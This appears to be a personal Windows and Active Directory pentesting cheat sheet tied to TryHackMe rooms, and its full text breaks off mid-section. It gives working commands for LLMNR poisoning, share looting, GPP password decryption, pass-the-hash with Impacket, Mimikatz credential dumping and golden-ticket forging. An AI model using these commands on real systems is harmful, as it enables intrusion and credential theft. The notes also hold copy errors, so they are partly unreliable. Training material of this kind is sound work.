# Windwos and Active Directory cheat sheet

# Table of content 

- [cheat sheets and resources](#cheat-sheets-and-resources)
------------------------------------------------------------------------------------
## tools
- [tools](#tools)
  - [PowerView/SharpView](#PowerViewSharpView)
  - [BloodHound](#BloodHound)
  - [SharpHound](#SharpHound)
  - [BloodHound-py](#BloodHound-py)
  - [AD Kerbrute](#AD-Kerbrute)
  - [Impacket toolkit](#Impacket-toolkit)
  - [AD Responder](#AD-Responder)
  - [Inveigh-ps1](#Inveigh-ps1)
  - [C-plus Inveigh InveighZero](#C-plus-Inveigh-InveighZero)
  - [CrackMapExec CME](#CrackMapExec-CME)
  - [Rubeus](#Rubeus)
  - [GetUserSPNs-py](#GetUserSPNs-py)
  - [AD enum4linux](#AD-enum4linux)
  - [enum4linux ng](#enum4linux-ng)
  - [ldapsearch](#ldapsearch)
  - [windapsearch](#windapsearch)
  - [DomainPasswordSpray-ps1](#DomainPasswordSpray-ps1)
  - [LAPSToolkit](#LAPSToolkit)
  - [smbmap](#smbmap)
  - [smbclient](#smbclient)
  - [psexec-py](#psexec-py)
  - [wmiexec-py](#wmiexec-py)
  - [smbexec-py](#smbexec-py)
  - [dcomexec-py](#dcomexec-py)
  - [atexec-py](#atexec-py)
  - [smbserver-py](#smbserver-py)
  - [Snaffler](#Snaffler)
  - [setspn exe](#setspn-exe)
  - [Mimikatz](#Mimikatz)
  - [kekeo](#kekeo)
  - [secretsdump-py](#secretsdump-py)
  - [AD evil winrm](#AD-evil-winrm)
  - [mssqlclient-py](#mssqlclient-py)
  - [noPac py](#noPac-py)
  - [rpcdump-py](#rpcdump-py)
  - [CVE 2021 1675-py](#CVE-2021-1675-py)
  - [ntlmrelayx-py](#ntlmrelayx-py)
  - [PetitPotam-py](#PetitPotam-py)
  - [gettgtpkinit-py](#gettgtpkinit-py)
  - [getnthash-py](#getnthash-py)
  - [adidnsdump](#adidnsdump)
  - [gpp-decrypt](#gpp-decrypt)
  - [GetNPUsers-py](#GetNPUsers-py)
  - [lookupsid-py](#lookupsid-py)
  - [ticketer-py](#ticketer-py)
  - [raiseChild-py](#raiseChild-py)
  - [Active Directory Explorer](#Active-Directory-Explorer)
  - [PingCastle](#PingCastle)
  - [Group3r](#Group3r)
  - [ADRecon](#ADRecon)
  - [tcpdump](#tcpdump)
  - [net creds](#net-creds)
  - [NetMiner](#NetMiner)
  - [Fping](#Fping)
  - [linkedin2username](#linkedin2username)
  - [SharpGPOAbuse](#SharpGPOAbuse)
  - [nsupdate](#nsupdate)
  - [openssl](#openssl)
  - [mslink](#mslink)
  - [Invoke PowerShellTcp ps1](#Invoke-PowerShellTcp-ps1)
  - [nishang](#nishang)
  - [winexe](#winexe)
  - [snmpwalk](#snmpwalk)
  - ------------------------------------------------------------------------------------
## Pivoting Tunneling and Port Forwarding
- [Pivoting Tunneling and Port Forwarding](#Pivoting-Tunneling-and-Port-Forwarding)
  - [Meterpreter Tunneling and Port Forwarding](#Meterpreter-Tunneling-and-Port-Forwarding)
  - [sshuttle](#sshuttle)
  - [chisel](#chisel)
  - [Dynamic Port Forwarding with SSH and SOCKS Tunneling](#Dynamic-Port-Forwarding-with-SSH-and-SOCKS-Tunneling)
  - [Remote-Reverse Port Forwarding with SSH](#Remote-Reverse-Port-Forwarding-with-SSH)
  - [Socat Redirection with a Reverse Shell](#Socat-Redirection-with-a-Reverse-Shell)
  - [Socat Redirection with a Bind Shell](#Socat-Redirection-with-a-Bind-Shell)
  - [SSH for Windows plink exe](#SSH-for-Windows-plink-exe)
  - [SSH Pivoting with Sshuttle](#SSH-Pivoting-with-Sshuttle)
  - [Web Server Pivoting with Rpivot](#Web-Server-Pivoting-with-Rpivot)
------------------------------------------------------------------------------------
## Local Windows
------------------------------------------------------------------------------------
## Tib3rius ⁣Privilege Escalation
- [Local Privilige Escalation](#Local-Privilige-Escalation)
  - [General Concepts](#General-Concepts)
- [understanding permissions in windows](#understanding-permissions-in-windows)
  - [user accounts](#user-accounts)
  - [service accounts](#service-accounts)
  - [groups](#groups)
  - [windows resources](#windows-resources)
  - [ACLs and ACEs](#ACLs-and-ACEs)
- [spawning administrator shells](#spawning-administrator-shells)
  - [msfvenom](#msfvenom)
  - [RDP](#RDP)
- [Privilege Escalation Tools](#Privilege-Escalation-Tools)
  - [PowerUpp and SharpUp](#PowerUpp-and-SharpUp)
  - [Seatbelt](#Seatbelt)
  - [Winpeas](#Winpeas)
  - [accesschk](#accesschk)
  
- [Kernel Exploits](#Kernel-Exploits)
- [Service Exploits](#Service-Exploits)
  - [Services](#Services)
  - [Service Misconfigurations](#Service-Misconfigurations)
  - [Insecure Service Permissions](#Insecure-Service-Permissions)
  - [Unquoted Service Path](#Unquoted-Service-Path)
  - [Weak Registry Permissions](#Weak-Registry-Permissions)
  - [Insecure Service Executables](#Insecure-Service-Executables)
  - [DLL Hijacking ](#DLL-Hijacking)
- [Registry exploits](#Registry-exploits)
  - [AutoRuns](#AutoRuns)
  - [AlwaysInstallElevated REG](#AlwaysInstallElevated-REG)
- [passwords](#passwords)
  - [Registry](#Registry)
  - [Searching the Registry for Passwords](#Searching-the-Registry-for-Passwords)
  - [Saved Creds](#Saved-Creds)
  - [Configuration Files](#Configuration-Files)
  - [Searching for Configuration Files](#Searching-for-Configuration-Files)
  - [SAM](#SAM)
  - [SAM/SYSTEM Locations](#SAM/SYSTEM-Locations)
  - [Passing the Hash](#Passing-the-Hash)
- [scheduled tasks](#scheduled-tasks)
- [insecure GUI apps](#insecure-GUI-apps)
- [startup apps](#startup-apps)
- [installed apps](#installed-apps)
- [hot potato](#hot-potato)
- [token impersonation](#token-impersonation)
- [port forwarding](#port-forwarding)
- [getsystem Named Pipes and Token Duplication](#getsystem-Named-Pipes-and-Token-Duplication)
- [user privileges](#user-privileges)
- [Privilege Escalation Strategy](#Privilege-Escalation-Strategy)
------------------------------------------------------------------------------------------------

## Windows priv esc Tryhackme 1 
```
https://tryhackme.com/room/windowsprivesc20
```
- [Privilege Escalation Techniques](#Privilege-Escalation-Techniques)
- [Harvesting Passwords from Usual Spots](#Harvesting-Passwords-from-Usual-Spots)
- [Other Quick Wins](#Other-Quick-Wins)
- [Abusing Service Misconfigurations](#Abusing-Service-Misconfigurations)
- [Abusing dangerous privileges](#Abusing-dangerous-privileges)
- [Abusing vulnerable software](#Abusing-vulnerable-software)


------------------------------------------------------------------------------------------------
# Credentials Harvesting tryhackme 
```
https://tryhackme.com/room/credharvesting
```

- [Local Windows Credentials](#Local-Windows-Credentials)
  - [Keystrokes](#Keystrokes)
  - [Security Account Manager SAM](#Security-Account-Manager-SAM)
  - [Metasploits HashDump](#Metasploits-HashDump)
  - [Volume Shadow Copy Service](#Volume-Shadow-Copy-Service)
  - [Registry Hives](#Registry-Hives)
- [Local Security Authority Subsystem Service LSASS](#Local-Security-Authority-Subsystem-Service-LSASS)
  - [What is the LSASS](#What-is-the-LSASS)
  - [Graphic User Interface GUI](#Graphic-User-Interface-GUI)
  - [Sysinternals Suite](#Sysinternals-Suite)
  - [local MimiKatz](#local-MimiKatz)
  - [Protected LSASS](#Protected-LSASS)
- [Windows Credential Manager](#Windows-Credential-Manager)
  - [What is Credentials Manager](#What-is-Credentials-Manager)
  - [Accessing Credential Manager](#Accessing-Credential-Manager)
  - [Credential Dumping](#Credential-Dumping)
  - [RunAs](#RunAs)
  - [local Mimikatz2](#local-Mimikatz2)

------------------------------------------------------------------------------------------------
## Windows Local Persistence tryhackme
```
https://tryhackme.com/room/windowslocalpersistence
```
- [Local Persistence](#Local-Persistence)
  - [persistence Introduction](#persistence-Introduction)
  - [Tampering With Unprivileged Accounts](#Tampering-With-Unprivileged-Accounts)
    - [Assign Group Memberships](#Assign-Group-Memberships)
    - [Special Privileges and Security Descriptors](#Special-Privileges-and-Security-Descriptors)
    - [RID Hijacking](#RID-Hijacking)
  - [Backdooring Files](#Backdooring-Files)
    - [Executable Files](#Executable-Files)
    - [Shortcut Files](#Shortcut-Files)
    - [Hijacking File Associations](#Hijacking-File-Associations)
  - [Abusing Services](#Abusing-Services)
    - [Creating backdoor services](#Creating-backdoor-services)
    - [Modifying existing services](#Modifying-existing-services)
  - [Abusing Scheduled Tasks](#Abusing-Scheduled-Tasks)
      - [Task Scheduler](#Task-Scheduler)
      - [Making Our Task Invisible](#Making-Our-Task-Invisible)
  - [Logon Triggered Persistence](#Logon-Triggered-Persistence)
      - [Startup folder](#Startup-folder)
      - [Run or RunOnce](#Run-or-RunOnce)
      - [Winlogon](#Winlogon)
      - [Logon scripts](#Logon-scripts)
  - [Backdooring the Login Screen RDP](#Backdooring-the-Login-Screen-RDP)
    - [Sticky Keys](#Sticky-Keys)
    - [Utilman](#Utilman)
  - [Persisting Through Existing Services](#Persisting-Through-Existing-Services)
    - [Using Web Shells](#Using-Web-Shells)
    - [Using MSSQL as a Backdoor](#Using-MSSQL-as-a-Backdoor)
  
  
  ------------------------------------------------------------------------------------------------
# basic machine enum tryhackme (windows) 
```
https://tryhackme.com/room/enumerationpe
```

- [basic local machine enumeration](#basic-local-machine-enumeration)
  - [System](#System)
  - [Users](#Users)
  - [Networking](#Networking)
  - [DNS](#DNS)
  - [SMB](#SMB)
  - [SNMP](#SNMP)
  
------------------------------------------------------------------------------------------------


------------------------------------------------------------------------------------------------


------------------------------------------------------------------------------------
# Active Directory 
------------------------------------------------------------------------------------
## Basic AD machine Enumeration
- [Basic AD machine Enumeration](#Basic-AD-machine-Enumeration)
  - [Credential Injection](#Credential-Injection)
  - [Enumeration through Microsoft Management Console](#Enumeration-through-Microsoft-Management-Console)
  - [Enumeration through Command Prompt](#Enumeration-through-Command-Prompt)
  - [Enumeration through PowerShell](#Enumeration-through-PowerShell)
  - [Enumeration through Bloodhound](#Enumeration-through-Bloodhound)
  - [Enumeration through winpeas](#Enumeration-through-winpeas)
  - [Enumeration through seatbelt](#Enumeration-through-seatbelt)
  - [Enumeration through powerview](#Enumeration-through-powerview)
    - [Introduction to PowerView](#Introduction-to-PowerView)
    - [Get-NetDomain](#Get-NetDomain)
    - [Get-NetDomainController](#Get-NetDomainController)
    - [Get-NetForest](#Get-NetForest)
    - [Get-NetDomainTrust](#Get-NetDomainTrust)
  - [Enumeration through PrivescCheck](#Enumeration-through-PrivescCheck)
  - [Enumeration through WES NG Windows Exploit Suggester the Next Generation](#Enumeration-through-WES-NG-Windows-Exploit-Suggester-the-Next-Generation)
------------------------------------------------------------------------------------
## AD focused Privilige Escalation
- [AD focused Privilige Escalation and enumeration](#AD-focused-Privilige-Escalation-and-enumeration)
  - [AD resources](#AD-resources)
  - [basic](#basic)
  - [metasploit exploit suggester](#metasploit-exploit-suggester)
  - [powershell](#powershell)
    - [Powershell Overview](#Powershell-Overview)
    - [Using Get-Help](#Using-Get-Help)
    - [Using Get-Command](#Using-Ge-Command)
    - [Object Manipulation](#Object-Manipulation)
    - [Creating Objects From Previous cmdlets](#Creating-Objects-From-Previous-cmdlets)
    - [Filtering Objects](#Filtering-Objects)
    - [Sort Object](#Sort-Object)
    - [Introduction to Offensive Powershell](#Introduction-to-Offensive-Powershell)
------------------------------------------------------------------------------------------------
  - [Get LAPSPasswords](#Get-LAPSPasswords)
  - [powerup](#powerup)
  - [sweetpotato](#sweetpotato)
  - [JuicyPotato](#JuicyPotato)
  - [hotpotato](#hotpotato)
  - [rottenpotato](#rottenpotato)
  - [lonelypotato](#lonelypotato)
  - [roguepotato](#roguepotato)
  - [genericpotato](#genericpotato)
  - [printnightmare](#printnightmare)
------------------------------------------------------------------------------------
- [extra tools](#extra-tools)
- [Domain Controller cred dump](#Domain-Controller)
  - [NTDS Domain Controller](#NTDS-Domain-Controller)
  - [Ntdsutil](#Ntdsutil)
  - [Local Dumping No Credentials](#Local-Dumping-No-Credentials)
  - [Remote Dumping With Credentials](#Remote-Dumping-With-Credentials)
  - [DC Sync](#DC-Sync)
- [Local Administrator Password Solution LAPS](#Local-Administrator-Password-Solution-LAPS)
  - [Group Policy Preferences GPP](#Group-Policy-Preferences-GPP)
  - [Local Administrator Password Solution LAPS2](#Local-Administrator-Password-Solution-LAPS2)
  - [Enumerate for LAPS](#Enumerate-for-LAPS)
  - [Getting the Password](#Getting-the-Password)
- [AD Kerberoasting](#AD-Kerberoasting)
- [AS REP Roasting](#AS-REP-Roasting)
- [SMB Relay Attack](#SMB-Relay-Attack)
- [LLMNR NBNS Poisoning](#LLMNR-NBNS-Poisoning)
 
------------------------------------------------------------------------------------

# Its you versus them

![image](https://user-images.githubusercontent.com/24814781/181242943-3a5e94d9-fe81-4004-8c29-facac58d4c64.png)

## "If you know the enemy and know yourself, you need not fear the results of a hundred battles. If you know yourself but not the enemy, for every victory gained you will also suffer defeat." - Sun Tzu, Art of War.

## cheat sheets and resources
```
https://hackersploit.org/
```
```
https://github.com/cube0x0/Security-Assessment
```
```
https://adsecurity.org/?p=1001
```
```
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
```
```
https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/
```
```
https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html
```
```
https://adepts.of0x.cc/shadowmove-hijack-socket/
```
```
https://pentestwiki.org/privilege-escalation-in-windows-and-linux/
```
```
https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
```
-------------------------------------------------------------------------------------

## tools

### PowerView/SharpView
A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows net* commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting.
```
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```

```
https://github.com/dmchell/SharpView
```
### BloodHound
Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the SharpHound PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a Neo4j database for graphical analysis of the AD environment.
```
https://github.com/BloodHoundAD/BloodHound
```
#### resources 
```
https://www.youtube.com/watch?v=aJqjH3MsbLM
```
```
https://www.youtube.com/watch?v=gXFCiB2KI9M&t
```
```
https://www.youtube.com/watch?v=y3tB-9VBELc&t=255s
```
```
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound
```


### SharpHound

The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.

```
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
```
### BloodHound py

A Python-based BloodHound ingestor based on the Impacket toolkit. It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis.
```
https://github.com/fox-it/BloodHound.py
```
### AD Kerbrute
A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts, perform password spraying, and brute-forcing.

```
https://github.com/ropnop/kerbrute
```

### Impacket toolkit
A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory.

```
https://github.com/SecureAuthCorp/impacket
```

### Responder
Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.

```
https://github.com/lgandx/Responder
```
### Inveigh ps1
Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks.
```
https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1
```
```
https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters
```
example:
```
Import-Module .\Inveigh.ps1
```
```
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### C-plus Inveigh InveighZero
The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes.

```
https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh
```
### rpcclient 
A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.

```
https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html
```

### CrackMapExec CME
CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL.
```
https://github.com/byt3bl33d3r/CrackMapExec
```
videos and demos:
```
https://www.youtube.com/watch?v=I2ctzF1tZX8&ab_channel=HillbillyStorytime
```
#### help section generic

options:

-h, --help            show this help message and exit

-t THREADS            set how many concurrent threads to use (default: 100)

--timeout TIMEOUT     max timeout in seconds of each thread (default: None)

--jitter INTERVAL     sets a random delay between each connection (default: None)

--darrell             give Darrell a hand

--verbose             enable verbose output

protocols:

available protocols


{smb,winrm,mssql,ldap,ssh}

smb - own stuff using SMB

winrm - own stuff using WINRM

mssql - own stuff using MSSQL

ldap - own stuff using LDAP

ssh - own stuff using SSH





### Rubeus 
Rubeus is a C# tool built for Kerberos Abuse.
```
https://github.com/GhostPack/Rubeus
```

### GetUserSPNs py
Another Impacket module geared towards finding Service Principal names tied to normal users.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
```

### AD enum4linux
A tool for enumerating information from Windows and Samba systems.
```
https://github.com/CiscoCXSecurity/enum4linux
```

### enum4linux ng
The tool enum4linux-ng is a rewrite of enum4linux in Python, but has additional features such as the ability to export data as YAML or JSON files which can later be used to process the data further or feed it to other tools. It also supports colored output, among other features
```
https://github.com/cddmp/enum4linux-ng
```

### ldapsearch
Built-in interface for interacting with the LDAP protocol.
```
https://linux.die.net/man/1/ldapsearch
```
#### Bypass TLS SNI check
According to this writeup:
```
https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/
```
just by accessing the LDAP server with an arbitrary domain name (like company.com) he was able to contact the LDAP service and extract information as an anonymous user:
```
ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```


### windapsearch
A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries.

```
https://github.com/ropnop/windapsearch
```
pre compiled binary wich acatualy works (for me) 
```
https://github.com/ropnop/go-windapsearch/releases
```
windapsearch is a tool to assist in Active Directory Domain enumeration through LDAP queries. It contains several modules to enumerate users, groups, computers, as well as perform searching and unauthenticated information gathering.

For usage examples of each of the modules, view the modules README
```
https://github.com/ropnop/go-windapsearch/blob/master/pkg/modules/README.md
```
In addition to performing common LDAP searches, windapsearch now also has the option to convert LDAP results to JSON format for easy parsing. When performing JSON encoding, windapsearch will automatically convert certain LDAP attributes to a more human friendly format as well (e.g. timestamps, GUIDs, enumerations, etc)
```
./windapsearch -h
windapsearch: a tool to perform Windows domain enumeration through LDAP queries
Version: dev (9f91330) | Built: 03/04/21 (go1.16) | Ronnie Flathers @ropnop

Usage: ./windapsearch [options] -m [module] [module options]

Options:
  -d, --domain string            The FQDN of the domain (e.g. 'lab.example.com'). Only needed if dc not provided
      --dc string                The Domain Controller to query against
  -u, --username string          The full username with domain to bind with (e.g. 'ropnop@lab.example.com' or 'LAB\ropnop')
                                  If not specified, will attempt anonymous bind
      --bindDN string            Full DN to use to bind (as opposed to -u for just username)
                                  e.g. cn=rflathers,ou=users,dc=example,dc=com
  -p, --password string          Password to use. If not specified, will be prompted for
      --hash string              NTLM Hash to use instead of password (i.e. pass-the-hash)
      --ntlm                     Use NTLM auth (automatic if hash is set)
      --port int                 Port to connect to (if non standard)
      --secure                   Use LDAPS. This will not verify TLS certs, however. (default: false)
      --proxy string             SOCKS5 Proxy to use (e.g. 127.0.0.1:9050)
      --full                     Output all attributes from LDAP
      --ignore-display-filters   Ignore any display filters set by the module and always output every entry
  -o, --output string            Save results to file
  -j, --json                     Convert LDAP output to JSON
      --page-size int            LDAP page size to use (default 1000)
      --version                  Show version info and exit
  -v, --verbose                  Show info logs
      --debug                    Show debug logs
  -h, --help                     Show this help
  -m, --module string            Module to use

Available modules:
    admin-objects       Enumerate all objects with protected ACLs (i.e admins)
    computers           Enumerate AD Computers
    custom              Run a custom LDAP syntax filter
    dns-names           List all DNS Names
    dns-zones           List all DNS Zones
    domain-admins       Recursively list all users objects in Domain Admins group
    gpos                Enumerate Group Policy Objects
    groups              List all AD groups
    members             Query for members of a group
    metadata            Print LDAP server metadata
    privileged-users    Recursively list members of all highly privileged groups
    search              Perform an ANR Search and return the results
    unconstrained       Find objects that allow unconstrained delegation
    user-spns           Enumerate all users objects with Service Principal Names (for kerberoasting)
    users               List all user objects
```

Windapsearch can also be used to dump all attributes from LDAP. This way we can check for
passwords stored in descriptions or other fields.


Let's check if LDAP anonymous binds are allowed and attempt to retrieve a list of users. To do
this, we can use Windapsearch.
examples: 
```
windapsearch.py -d <domain> --dc-ip <ip> -U
```


Windapsearch can also be used to dump all attributes from LDAP. This way we can check for
passwords stored in descriptions or other fields.
```
windapsearch.py -d <domain> --dc-ip <ip> -U --full |
grep Password
```


### DomainPasswordSpray ps1
DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.
```
https://github.com/dafthack/DomainPasswordSpray
```

### LAPSToolkit
LAPSToolkit 	The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).
```
https://github.com/leoloobeek/LAPSToolkit
```

### smbmap
SMB share enumeration across a domain.

examples:
```
smbmap -H <ip>
```
```
smbmap -R <path you want to look in> -H <ip>
```

(look for a file and then download it)
```
smbmap -R <path> -H <ip> -A <file> -q 
```
obs depending where you are in terminal etc you might wanna type 
```
sudo updatedb
```
and it will come in the dir you are in if not it will be in "/usr/share/smbmap"

```
https://github.com/ShawnDEvans/smbmap
```

obs: files like Groups.xml in shares like sysvol etc is an old way now laps is used but if Groups.xlm is used its a good find. in there is a name/user and password witch is an ecrypted password but ban be cracked using ggp-decrypt

example:
```
ggp-decrypt <the encrypted password>
```

### smbclient
Samba is an implementation of the SMB/CIFS protocol for Unix systems, providing support for cross-platform file and printer sharing with Microsoft Windows, OS X, and other Unix systems.

This package contains command-line utilities for accessing Microsoft Windows and Samba servers, including smbclient, smbtar, and smbspool. Utilities for mounting shares locally are found in the package cifs-utils.

examples:
```
smbclient -L //<ip>/
```

```
smbclient //<ip>/<path>
```

obs: if you want to download either the whole folder/share or file you can do this:
```
RECURSE ON
```
```
PROMPT OFF
```
```
mget *
```
mget can be used just to download files to


obs: files like Groups.xml in shares like sysvol etc is an old way now laps is used but if Groups.xlm is used its a good find. in there is a name/user and password witch is an ecrypted password but ban be cracked using ggp-decrypt

example:
```
ggp-decrypt <the encrypted password>
```

### psexec-py
Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
```
```
https://vk9-sec.com/impacket-remote-code-execution-rce-on-windows-from-linux/
```

This method is very similar to the traditional PsExec from SysInternals. In this case, however, Impacket uses RemComSvc utility.

The way it works is that Impacket will upload the RemComSvc utility on a writable share on the remote system and then register it as a Windows service.

This will result in having an interactive shell available on the remote Windows system via port tcp/445.

“You have to have administrator to PSExec.”

Requirements for PSExec

1. Write a file to the share.
2. Create and start a service.

basic example usage:
```
psexec.py <domain>/<user>:<password>@<ip$>
```


example using a hash (the hash is an example)
```
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e21bf3dfb1cb61fa095b40fb083149cf <user>@<ip$>
```



### wmiexec-py
Part of the Impacket toolkit, it provides the capability of command execution over WMI.

```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py
```
```
https://vk9-sec.com/impacket-remote-code-execution-rce-on-windows-from-linux/
```
basic example usage:
```
wmiexec.py <domain>/<user>:<password>@<ip$>
```


example using a hash (the hash is an example)
```
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e21bf3dfb1cb61fa095b40fb083149cf <user>@<ip$>
```

### smbexec-py

Smbexec.py method takes advantage of the native Windows SMB functionality to execute arbitrary commands on the remote system.

This approach does not require anything to be uploaded on the remote system and is therefore somewhat less noisy.

Note that the communication happens solely over port tcp/445.

Smbexec.py uses a similar approach to psexec w/o using RemComSvc. This script works in two ways:

*    share mode: you specify a share, and everything is done through that share.
*    server mode: if for any reason there’s no share available, this script will launch a local SMB server, so the output of the commands executed is sent back by the target machine into a locally shared folder. Keep in mind you would need root access to bind to port 445 in the local machine.


basic example usage:
```
smbexec.py <domain>/<user>:<password>@<ip$>
```
```
https://vk9-sec.com/impacket-remote-code-execution-rce-on-windows-from-linux/
```

example using a hash (the hash is an example)
```
smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e21bf3dfb1cb61fa095b40fb083149cf <user>@<ip$>
```

### dcomexec-py
Dcomexec.py method uses various DCOM endpoints such as MMC20.Application, ShellWindows or ShellBrowserWindow objects to spawn a semi-interactive shell on the remote system.

Using this method requires communication on multiple network ports (tcp/135, tcp/445) and internally utilizes the DCOM subsystem of the remote Windows system using a dynamically allocated high port such as tcp/49751

This generally makes this method somewhat more noisy that the other methods.

basic example usage:
```
dcomexec.py <domain>/<user>:<password>@<ip$>
```
```
https://vk9-sec.com/impacket-remote-code-execution-rce-on-windows-from-linux/
```

example using a hash (the hash is an example)
```
smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e21bf3dfb1cb61fa095b40fb083149cf <user>@<ip$>
```

### atexec-py
atexec.py uses the Task Scheduler service (Atsvc) on the remote Windows system to execute a supplied command. All network communication takes place over port tcp/445.

basic example usage:
```
atexec.py <domain>/<user>:<password>@<ip$>
```
example using a hash (the hash is an example)
```
smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e21bf3dfb1cb61fa095b40fb083149cf <user>@<ip$> systeminfo
```


### smbserver-py
Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.

```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py
```
```
https://vk9-sec.com/impacket-remote-code-execution-rce-on-windows-from-linux/
```



### Snaffler
Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares.

```
https://github.com/SnaffCon/Snaffler
```


### setspn-exe
Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.

```
https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)
```

### Mimikatz
Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host.

```
https://github.com/ParrotSec/mimikatz
```
```
https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz
```
you'll want to type privilege::debug which will then put you in Debug mode, a mode that can only be granted by an Administrator. From there, we will want to elevate privileges to NT Authority (if you don't have it already) with token::elevate. This will grant you the highest level access that Microsoft has to offer, which will allow you to do basically anything on the system. It's close to the Root user account in Linux.

1.) privilege::debug

2.) token::elevate  

#### Dumping Password Hashes

Mimikatz has a few options for dumping password hashes on Non-DC Endpoints well only be covering a few of the many commands and modules Mimikatz has. Mimikatz has a general template syntax most commands have the Mimikatz module first, followed by two colons, the command to be run, and any parameters that need to be specified at the end. for example
```
privilege::debug
```
-- this obtains debug privileges which (without going into too much depth in the Windows privilege structure) allows us to access other processes for "debugging" purposes.
```
token::elevate
```
-- simply put, this takes us from our administrative shell with high privileges into a SYSTEM level shell with maximum privileges. This is something that we have a right to do as an administrator, but that is not usually possible using normal Windows operations.



lsadump::sam dumps the local Security Account Manager (SAM) NT hashes (cf. SAM secrets dump). It can operate directly on the target system, or offline with registry hives backups (for SAM and SYSTEM ). It has the following command line arguments: /sam : the offline backup of the SAM hive.

#### Dumping from LSA
The LSA (Local Security Authority) also handles credentials used by the system, from everything to basic password changes to creation of access tokens, it's another ideal candidate for us to dump hashes from. The output is not as large as lsadump::lsa which makes it much easier to work with.

lsadump::sam dumps the local Security Account Manager (SAM) NT hashes (cf. SAM secrets dump). It can operate directly on the target system, or offline with registry hives backups (for SAM and SYSTEM ). It has the following command line arguments: /sam : the offline backup of the SAM hive.
```
lsadump::lsa /patch
```
alternatively:
```
lsadump::lsa 
```

This is used to dump all local credentials on a Windows computer. LSADUMP::Trust – Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly).

#### Dumping SAM Hashes

There are a variety of commands we could use here, all of which do slightly different things. The command that we will use is: lsadump::sam.
When executed, this will provide us with a list of password hashes for every account on the machine (with some extra information thrown in as well). The Administrator account password hash should be fairly near the top of the list.

The SAM (Security Account Manager) holds a copy of all the user's passwords which makes it a valuable file for us to dump. The output can be convoluted and large, so you should transport it onto your Kali machine for further analysis.

1.) lsadump::sam 

execute: 
```
lsadump::sam
```

#### Dumping Creds from Logged In Users

Another method of attacking lsass through Mimikatz is with the sekurlsa module. It will attempt to retrieve the credentials/hashes of currently logged in users. This being the least preferred method for dumping credentials in Mimikatz.

1.) sekurlsa::logonPasswords 


#### other examples
```
sekurlsa::tickets /export
```



#### golden ticket example:
first 
```
lsadump::lsa /inject /name:krbtgt
```

basic to create a Golden Ticket
```
kerberos::golden /user: /domain: /sid: /krbtgt: /id:
```
one example:
```
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-3893474861-143125734-2112006029 /krbtgt:78558f004296a6f9438f4532164a7acd /id:500
```

alternative

```
.\mimikatz.exe "kerberos::golden /User:Administrator /domain:rd.lab.adsecurity.org /id:512 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
```
1.) 
```
misc::cmd
```
This will open a new command prompt with elevated privileges to all machines


2.) Access other Machines! - You will now have another command prompt with access to all other machines on the network



Use the Golden Ticket to access other machine -

Mimikatz Golden Ticket Command Reference:

